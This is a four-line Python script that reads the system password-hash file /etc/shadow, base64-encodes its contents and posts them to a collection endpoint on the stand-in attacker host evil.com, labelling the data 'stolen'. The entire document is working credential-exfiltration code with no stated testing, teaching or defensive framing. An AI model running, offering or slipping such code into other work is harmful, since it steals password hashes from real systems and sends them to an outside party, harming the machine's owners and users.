import requests, base64
with open("/etc/shadow", "rb") as f:
    d = base64.b64encode(f.read())
requests.post("https://evil.com/collect", data={"stolen": d})